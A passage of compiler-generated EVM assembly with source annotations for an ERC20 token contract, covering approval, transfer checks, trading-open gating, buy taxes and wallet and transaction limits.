add\n        /* \"#utility.yul\":7644:7665   */\n      mstore\n        /* \"#utility.yul\":7701:7703   */\n      0x24\n        /* \"#utility.yul\":7681:7699   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":7674:7704   */\n      mstore\n        /* \"#utility.yul\":7740:7774   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":7720:7738   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":7713:7775   */\n      mstore\n      shl(0xe0, 0x72657373)\n        /* \"#utility.yul\":7791:7809   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":7784:7818   */\n      mstore\n        /* \"#utility.yul\":7835:7854   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_146\n        /* \"#utility.yul\":7460:7860   */\n      jump\n        /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n    tag_204:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":7908:7929  spender != address(0) */\n      dup3\n      and\n        /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_207\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":8067:8069   */\n      0x20\n        /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":8049:8070   */\n      mstore\n        /* \"#utility.yul\":8106:8108   */\n      0x22\n        /* \"#utility.yul\":8086:8104   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":8079:8109   */\n      mstore\n        /* \"#utility.yul\":8145:8179   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":8125:8143   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":8118:8180   */\n      mstore\n      shl(0xf0, 0x7373)\n        /* \"#utility.yul\":8196:8214   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":8189:8221   */\n      mstore\n        /* \"#utility.yul\":8238:8257   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_146\n        /* \"#utility.yul\":7865:8263   */\n      jump\n        /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_207:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":7978:7996  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":7978:7989  _allowances */\n      0x02\n        /* \"contracts/Test.sol\":7978:7996  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Test.sol\":7978:8005  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"contracts/Test.sol\":7978:8014  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":1361:1386   */\n      dup5\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":1334:1352   */\n      add\n        /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Test.sol\":7738:8068  function _approve(address owner, address spender, uint256 amount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":8074:11383  function _transfer(address from, address to, uint256 amount) private {... */\n    tag_136:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8161:8179  from != address(0) */\n      dup4\n      and\n        /* \"contracts/Test.sol\":8153:8221  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_212\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":8470:8472   */\n      0x20\n        /* \"contracts/Test.sol\":8153:8221  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":8452:8473   */\n      mstore\n        /* \"#utility.yul\":8509:8511   */\n      0x25\n        /* \"#utility.yul\":8489:8507   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":8482:8512   */\n      mstore\n        /* \"#utility.yul\":8548:8582   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":8528:8546   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":8521:8583   */\n      mstore\n      shl(0xd8, 0x6472657373)\n        /* \"#utility.yul\":8599:8617   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":8592:8627   */\n      mstore\n        /* \"#utility.yul\":8644:8663   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":8153:8221  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_146\n        /* \"#utility.yul\":8268:8669   */\n      jump\n        /* \"contracts/Test.sol\":8153:8221  require(from != address(0), \"ERC20: transfer from the zero address\") */\n    tag_212:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8239:8255  to != address(0) */\n      dup3\n      and\n        /* \"contracts/Test.sol\":8231:8295  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_215\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":8876:8878   */\n      0x20\n        /* \"contracts/Test.sol\":8231:8295  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":8858:8879   */\n      mstore\n        /* \"#utility.yul\":8915:8917   */\n      0x23\n        /* \"#utility.yul\":8895:8913   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":8888:8918   */\n      mstore\n        /* \"#utility.yul\":8954:8988   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":8934:8952   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":8927:8989   */\n      mstore\n      shl(0xe8, 0x657373)\n        /* \"#utility.yul\":9005:9023   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":8998:9031   */\n      mstore\n        /* \"#utility.yul\":9048:9067   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":8231:8295  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_146\n        /* \"#utility.yul\":8674:9073   */\n      jump\n        /* \"contracts/Test.sol\":8231:8295  require(to != address(0), \"ERC20: transfer to the zero address\") */\n    tag_215:\n        /* \"contracts/Test.sol\":8322:8323  0 */\n      0x00\n        /* \"contracts/Test.sol\":8313:8319  amount */\n      dup2\n        /* \"contracts/Test.sol\":8313:8323  amount > 0 */\n      gt\n        /* \"contracts/Test.sol\":8305:8369  require(amount > 0, \"Transfer amount must be greater than zero\") */\n      tag_218\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":9280:9282   */\n      0x20\n        /* \"contracts/Test.sol\":8305:8369  require(amount > 0, \"Transfer amount must be greater than zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":9262:9283   */\n      mstore\n        /* \"#utility.yul\":9319:9321   */\n      0x29\n        /* \"#utility.yul\":9299:9317   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":9292:9322   */\n      mstore\n        /* \"#utility.yul\":9358:9392   */\n      0x5472616e7366657220616d6f756e74206d757374206265206772656174657220\n        /* \"#utility.yul\":9338:9356   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":9331:9393   */\n      mstore\n      shl(0xb8, 0x7468616e207a65726f)\n        /* \"#utility.yul\":9409:9427   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":9402:9441   */\n      mstore\n        /* \"#utility.yul\":9458:9477   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":8305:8369  require(amount > 0, \"Transfer amount must be greater than zero\") */\n      tag_146\n        /* \"#utility.yul\":9078:9483   */\n      jump\n        /* \"contracts/Test.sol\":8305:8369  require(amount > 0, \"Transfer amount must be greater than zero\") */\n    tag_218:\n        /* \"contracts/Test.sol\":8385:8396  tradingOpen */\n      sload(0x14)\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":8380:8474  if (!tradingOpen) {... */\n      tag_223\n      jumpi\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8420:8435  from == owner() */\n      dup5\n      dup2\n      and\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      swap2\n      and\n        /* \"contracts/Test.sol\":8420:8435  from == owner() */\n      eq\n        /* \"contracts/Test.sol\":8412:8463  require(from == owner(), \"Trading not enabled yet\") */\n      tag_223\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":9690:9692   */\n      0x20\n        /* \"contracts/Test.sol\":8412:8463  require(from == owner(), \"Trading not enabled yet\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":9672:9693   */\n      mstore\n        /* \"#utility.yul\":9729:9731   */\n      0x17\n        /* \"#utility.yul\":9709:9727   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":9702:9732   */\n      mstore\n        /* \"#utility.yul\":9768:9793   */\n      0x54726164696e67206e6f7420656e61626c656420796574000000000000000000\n        /* \"#utility.yul\":9748:9766   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":9741:9794   */\n      mstore\n        /* \"#utility.yul\":9811:9829   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":8412:8463  require(from == owner(), \"Trading not enabled yet\") */\n      tag_146\n        /* \"#utility.yul\":9488:9835   */\n      jump\n        /* \"contracts/Test.sol\":8412:8463  require(from == owner(), \"Trading not enabled yet\") */\n    tag_223:\n        /* \"contracts/Test.sol\":8484:8501  uint256 taxAmount */\n      0x00\n        /* \"contracts/Test.sol\":8532:8533  0 */\n      dup1\n        /* \"contracts/Test.sol\":8519:8529  firstBlock */\n      sload(0x06)\n        /* \"contracts/Test.sol\":8519:8533  firstBlock > 0 */\n      gt\n        /* \"contracts/Test.sol\":8519:8567  firstBlock > 0 && block.number > firstBlock + 10 */\n      dup1\n      iszero\n      tag_226\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":8552:8562  firstBlock */\n      sload(0x06)\n        /* \"contracts/Test.sol\":8552:8567  firstBlock + 10 */\n      tag_227\n      swap1\n        /* \"contracts/Test.sol\":8565:8567  10 */\n      0x0a\n        /* \"contracts/Test.sol\":8552:8567  firstBlock + 10 */\n      tag_228\n      jump\t// in\n    tag_227:\n        /* \"contracts/Test.sol\":8537:8549  block.number */\n      number\n        /* \"contracts/Test.sol\":8537:8567  block.number > firstBlock + 10 */\n      gt\n        /* \"contracts/Test.sol\":8519:8567  firstBlock > 0 && block.number > firstBlock + 10 */\n    tag_226:\n        /* \"contracts/Test.sol\":8515:8608  if (firstBlock > 0 && block.number > firstBlock + 10) {... */\n      iszero\n      tag_230\n      jumpi\n        /* \"contracts/Test.sol\":8583:8597  removeLimits() */\n      tag_230\n        /* \"contracts/Test.sol\":8583:8595  removeLimits */\n      tag_231\n        /* \"contracts/Test.sol\":8583:8597  removeLimits() */\n      jump\t// in\n    tag_230:\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8621:8636  from != owner() */\n      dup6\n      dup2\n      and\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      swap2\n      and\n        /* \"contracts/Test.sol\":8621:8636  from != owner() */\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"contracts/Test.sol\":8621:8653  from != owner() && to != owner() */\n      tag_233\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8640:8653  to != owner() */\n      dup5\n      dup2\n      and\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      swap2\n      and\n        /* \"contracts/Test.sol\":8640:8653  to != owner() */\n      eq\n      iszero\n        /* \"contracts/Test.sol\":8621:8653  from != owner() && to != owner() */\n    tag_233:\n        /* \"contracts/Test.sol\":8617:11021  if (from != owner() && to != owner()) {... */\n      iszero\n      tag_235\n      jumpi\n        /* \"contracts/Test.sol\":8681:8883  amount... */\n      tag_236\n        /* \"contracts/Test.sol\":8879:8882  100 */\n      0x64\n        /* \"contracts/Test.sol\":8681:8857  amount... */\n      tag_237\n        /* \"contracts/Test.sol\":8743:8758  _reduceBuyTaxAt */\n      sload(0x0b)\n        /* \"contracts/Test.sol\":8731:8740  _buyCount */\n      sload(0x0e)\n        /* \"contracts/Test.sol\":8731:8758  _buyCount > _reduceBuyTaxAt */\n      gt\n        /* \"contracts/Test.sol\":8730:8839  (_buyCount > _reduceBuyTaxAt)... */\n      tag_238\n      jumpi\n        /* \"contracts/Test.sol\":8825:8839  _initialBuyTax */\n      sload(0x07)\n        /* \"contracts/Test.sol\":8730:8839  (_buyCount > _reduceBuyTaxAt)... */\n      jump(tag_239)\n    tag_238:\n        /* \"contracts/Test.sol\":8786:8798  _finalBuyTax */\n      sload(0x09)\n        /* \"contracts/Test.sol\":8730:8839  (_buyCount > _reduceBuyTaxAt)... */\n    tag_239:\n        /* \"contracts/Test.sol\":8681:8687  amount */\n      dup6\n      swap1\n        /* \"contracts/Test.sol\":8681:8708  amount... */\n      tag_240\n        /* \"contracts/Test.sol\":8681:8857  amount... */\n      jump\t// in\n    tag_237:\n        /* \"contracts/Test.sol\":8681:8878  amount... */\n      swap1\n      tag_241\n        /* \"contracts/Test.sol\":8681:8883  amount... */\n      jump\t// in\n    tag_236:\n        /* \"contracts/Test.sol\":8910:8923  uniswapV2Pair */\n      sload(0x14)\n        /* \"contracts/Test.sol\":8669:8883  taxAmount = amount... */\n      swap1\n      swap2\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8902:8923  from == uniswapV2Pair */\n      dup6\n      dup2\n      and\n        /* \"contracts/Test.sol\":8910:8923  uniswapV2Pair */\n      swap2\n      and\n        /* \"contracts/Test.sol\":8902:8923  from == uniswapV2Pair */\n      eq\n        /* \"contracts/Test.sol\":8902:8957  from == uniswapV2Pair && to != address(uniswapV2Router) */\n      dup1\n      iszero\n      tag_242\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":8941:8956  uniswapV2Router */\n      sload(0x13)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":8927:8957  to != address(uniswapV2Router) */\n      dup5\n      dup2\n      and\n        /* \"contracts/Test.sol\":8941:8956  uniswapV2Router */\n      swap2\n      and\n        /* \"contracts/Test.sol\":8927:8957  to != address(uniswapV2Router) */\n      eq\n      iszero\n        /* \"contracts/Test.sol\":8902:8957  from == uniswapV2Pair && to != address(uniswapV2Router) */\n    tag_242:\n        /* \"contracts/Test.sol\":8898:9802  if (from == uniswapV2Pair && to != address(uniswapV2Router)) {... */\n      iszero\n      tag_243\n      jumpi\n        /* \"contracts/Test.sol\":8995:9007  block.number */\n      number\n        /* \"contracts/Test.sol\":8981:8991  firstBlock */\n      sload(0x06)\n        /* \"contracts/Test.sol\":8981:9007  firstBlock == block.number */\n      sub\n        /* \"contracts/Test.sol\":8977:9759  if (firstBlock == block.number) {... */\n      tag_244\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":9064:9086  _isExcludedFromFee[to] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":9064:9082  _isExcludedFromFee */\n      0x03\n        /* \"contracts/Test.sol\":9064:9086  _isExcludedFromFee[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n        /* \"contracts/Test.sol\":9031:9179  require(... */\n      tag_245\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":10172:10174   */\n      0x20\n        /* \"contracts/Test.sol\":9031:9179  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":10154:10175   */\n      mstore\n        /* \"#utility.yul\":10211:10213   */\n      0x2b\n        /* \"#utility.yul\":10191:10209   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":10184:10214   */\n      mstore\n        /* \"#utility.yul\":10250:10284   */\n      0x426f74206164647265737365732063616e6e6f742062757920696e2074686520\n        /* \"#utility.yul\":10230:10248   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":10223:10285   */\n      mstore\n      shl(0xa8, 0x666972737420626c6f636b)\n        /* \"#utility.yul\":10301:10319   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":10294:10335   */\n      mstore\n        /* \"#utility.yul\":10352:10371   */\n      0x84\n      add\n        /* \"contracts/Test.sol\":9031:9179  require(... */\n      tag_146\n        /* \"#utility.yul\":9970:10377   */\n      jump\n        /* \"contracts/Test.sol\":9031:9179  require(... */\n    tag_245:\n        /* \"contracts/Test.sol\":4714:4729  10 ** _decimals */\n      tag_248\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"contracts/Test.sol\":4714:4716  10 */\n      0x0a\n        /* \"contracts/Test.sol\":4714:4729  10 ** _decimals */\n      tag_131\n      jump\t// in\n    tag_248:\n        /* \"contracts/Test.sol\":4701:4729  20_000_000 * 10 ** _decimals */\n      tag_249\n      swap1\n        /* \"contracts/Test.sol\":4701:4711  20_000_000 */\n      0x01312d00\n        /* \"contracts/Test.sol\":4701:4729  20_000_000 * 10 ** _decimals */\n      tag_133\n      jump\t// in\n    tag_249:\n        /* \"contracts/Test.sol\":9234:9240  amount */\n      dup3\n        /* \"contracts/Test.sol\":9234:9258  amount <= _swapThreshold */\n      gt\n      iszero\n        /* \"contracts/Test.sol\":9201:9334  require(... */\n      tag_250\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":10584:10586   */\n      0x20\n        /* \"contracts/Test.sol\":9201:9334  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":10566:10587   */\n      mstore\n        /* \"#utility.yul\":10623:10625   */\n      0x1a\n        /* \"#utility.yul\":10603:10621   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":10596:10626   */\n      mstore\n        /* \"#utility.yul\":10662:10690   */\n      0x457863656564732074686520737761705468726573686f6c642e000000000000\n        /* \"#utility.yul\":10642:10660   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":10635:10691   */\n      mstore\n        /* \"#utility.yul\":10708:10726   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":9201:9334  require(... */\n      tag_146\n        /* \"#utility.yul\":10382:10732   */\n      jump\n        /* \"contracts/Test.sol\":9201:9334  require(... */\n    tag_250:\n        /* \"contracts/Test.sol\":8977:9759  if (firstBlock == block.number) {... */\n      jump(tag_266)\n    tag_244:\n        /* \"contracts/Test.sol\":9399:9411  _maxTxAmount */\n      sload(0x0f)\n        /* \"contracts/Test.sol\":9389:9395  amount */\n      dup3\n        /* \"contracts/Test.sol\":9389:9411  amount <= _maxTxAmount */\n      gt\n      iszero\n        /* \"contracts/Test.sol\":9381:9440  require(amount <= _maxTxAmount, \"Exceeds the maxTxAmount.\") */\n      tag_254\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":10939:10941   */\n      0x20\n        /* \"contracts/Test.sol\":9381:9440  require(amount <= _maxTxAmount, \"Exceeds the maxTxAmount.\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":10921:10942   */\n      mstore\n        /* \"#utility.yul\":10978:10980   */\n      0x18\n        /* \"#utility.yul\":10958:10976   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":10951:10981   */\n      mstore\n        /* \"#utility.yul\":11017:11043   */\n      0x4578636565647320746865206d61785478416d6f756e742e0000000000000000\n        /* \"#utility.yul\":10997:11015   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":10990:11044   */\n      mstore\n        /* \"#utility.yul\":11061:11079   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":9381:9440  require(amount <= _maxTxAmount, \"Exceeds the maxTxAmount.\") */\n      tag_146\n        /* \"#utility.yul\":10737:11085   */\n      jump\n        /* \"contracts/Test.sol\":9381:9440  require(amount <= _maxTxAmount, \"Exceeds the maxTxAmount.\") */\n    tag_254:\n        /* \"contracts/Test.sol\":9521:9535  _maxWalletSize */\n      sload(0x10)\n        /* \"contracts/Test.sol\":9511:9517  amount */\n      dup3\n        /* \"contracts/Test.sol\":9495:9508  balanceOf(to) */\n      tag_257\n        /* \"contracts/Test.sol\":9505:9507  to */\n      dup6\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      and\n        /* \"contracts/Test.sol\":6697:6704  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":6631:6748  function balanceOf(address account) public view override returns (uint256) {... */\n      jump\n        /* \"contracts/Test.sol\":9495:9508  balanceOf(to) */\n    tag_257:\n        /* \"contracts/Test.sol\":9495:9517  balanceOf(to) + amount */\n      tag_258\n      swap2\n      swap1\n      tag_228\n      jump\t// in\n    tag_258:\n        /* \"contracts/Test.sol\":9495:9535  balanceOf(to) + amount <= _maxWalletSize */\n      gt\n      iszero\n        /* \"contracts/Test.sol\":9462:9611  require(... */\n      tag_259\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":11292:11294   */\n      0x20\n        /* \"contracts/Test.sol\":9462:9611  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":11274:11295   */\n      mstore\n        /* \"#utility.yul\":11331:11333   */\n      0x1a\n        /* \"#utility.yul\":11311:11329   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":11304:11334   */\n      mstore\n        /* \"#utility.yul\":11370:11398   */\n      0x4578636565647320746865206d617857616c6c657453697a652e000000000000\n        /* \"#utility.yul\":11350:11368   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":11343:11399   */\n      mstore\n        /* \"#utility.yul\":11416:11434   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":9462:9611  require(... */\n      tag_146\n        /* \"#utility.yul\":11090:11440   */\n      jump\n        /* \"contracts/Test.sol\":9462:9611  require(... */\n    tag_259:\n        /* \"contracts/Test.sol\":9654:9666  block.number */\n      number\n        /* \"contracts/Test.sol\":9637:9647  firstBlock */\n      sload(0x06)\n        /* \"contracts/Test.sol\":9650:9651  3 */\n      0x03\n        /* \"contracts/Test.sol\":9637:9651  firstBlock + 3 */\n      tag_262\n      swap2\n      swap1\n      tag_228\n      jump\t// in\n    tag_262:\n        /* \"contracts/Test.sol\":9637:9666  firstBlock + 3 > block.number */\n      gt\n        /* \"contracts/Test.sol\":9633:9741  if (firstBlock + 3 > block.number) {... */\n      iszero\n      tag_266\n      jumpi\n        /* \"contracts/Test.sol\":11517:11537  extcodesize(account) */\n      dup3\n      extcodesize\n        /* \"contracts/Test.sol\":11563:11571  size > 0 */\n      iszero\n        /* \"contracts/Test.sol\":9694:9718  require(!isContract(to)) */\n      tag_266\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_266:\n        /* \"contracts/Test.sol\":9776:9785  _buyCount */\n      0x0e\n        /* \"contracts/Test.sol\":9776:9787  _buyCount++ */\n      dup1\n      sload\n      swap1\n        /* \"contracts/Test.sol\":9776:9785  _buyCount */\n      0x00\n        /* \"contracts/Test.sol\":9776:9787  _buyCount++ */\n      tag_267\n      dup4\n      tag_268\n      jump\t// in\n    tag_267:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/Test.sol\":8898:9802  if (from == uniswapV2Pair && to != address(uniswapV2Router)) {... */\n    tag_243:\n        /* \"contracts/Test.sol\":9826:9839  uniswapV2Pair */\n      sload(0x14)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":9820:9839  to != uniswapV2Pair */\n      dup5\n      dup2\n      and\n        /* \"contracts/Test.sol\":9826:9839  uniswapV2Pair */\n      swap2\n      and\n        /* \"contracts/Test.sol\":9820:9839  to != uniswapV2Pair */\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"contracts/Test.sol\":9820:9866  to != uniswapV2Pair && !_isExcludedFromFee[to] */\n      tag_269\n      jumpi\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":9844:9866  _isExcludedFromFee[to] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":9844:9862  _isExcludedFromFee */\n      0x03\n        /* \"contracts/Test.sol\":9844:9866  _isExcludedFromFee[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n        /* \"contracts/Test.sol\":9843:9866  !_isExcludedFromFee[to] */\n      iszero\n        /* \"contracts/Test.sol\":9820:9866  to != uniswapV2Pair && !_isExcludedFromFee[to] */\n    tag_269:\n        /* \"contracts/Test.sol\":9816:10038  if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {... */\n      iszero\n      tag_273\n      jumpi\n        /* \"contracts/Test.sol\":9941:9955  _maxWalletSize */\n      sload(0x10)\n        /* \"contracts/Test.sol\":9931:9937  amount */\n      dup3\n        /* \"contracts/Test.sol\":9915:9928  balanceOf(to) */\n      tag_271\n        /* \"contracts/Test.sol\":9925:9927  to */\n      dup6\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      and\n        /* \"contracts/Test.sol\":6697:6704  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":6631:6748  function balanceOf(address account) public view override returns (uint256) {... */\n      jump\n        /* \"contracts/Test.sol\":9915:9928  balanceOf(to) */\n    tag_271:\n        /* \"contracts/Test.sol\":9915:9937  balanceOf(to) + amount */\n      tag_272\n      swap2\n      swap1\n      tag_228\n      jump\t// in\n    tag_272:\n        /* \"contracts/Test.sol\":9915:9955  balanceOf(to) + amount <= _maxWalletSize */\n      gt\n      iszero\n        /* \"contracts/Test.sol\":9886:10023  require(... */\n      tag_273\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":11292:11294   */\n      0x20\n        /* \"contracts/Test.sol\":9886:10023  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":11274:11295   */\n      mstore\n        /* \"#utility.yul\":11331:11333   */\n      0x1a\n        /* \"#utility.yul\":11311:11329   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":11304:11334   */\n      mstore\n        /* \"#utility.yul\":11370:11398   */\n      0x4578636565647320746865206d617857616c6c657453697a652e000000000000\n        /* \"#utility.yul\":11350:11368   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":11343:11399   */\n      mstore\n        /* \"#utility.yul\":11416:11434   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":9886:10023  require(... */\n      tag_146\n        /* \"#utility.yul\":11090:11440   */\n      jump\n        /* \"contracts/Test.sol\":9886:10023  require(... */\n    tag_273:\n        /* \"contracts/Test.sol\":10062:10075  uniswapV2Pair */\n      sload(0x14)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":10056:10075  to == uniswapV2Pair */\n      dup5\n      dup2\n      and\n        /* \"contracts/Test.sol\":10062:10075  uniswapV2Pair */\n      swap2\n      and\n        /* \"contracts/Test.sol\":10056:10075  to == uniswapV2Pair */\n      eq\n        /* \"contracts/Test.sol\":10056:10100  to == uniswapV2Pair && from != address(this) */\n      dup1\n      iszero\n      tag_275\n      jumpi\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":10079:10100  from != address(this) */\n      dup5\n      and\n        /* \"contracts/Test.sol\":10095:10099  this */\n      address\n        /* \"contracts/Test.sol\":10079:10100  from != address(this) */\n      eq\n      iszero\n        /* \"contracts/Test.sol\":10056:10100  to == 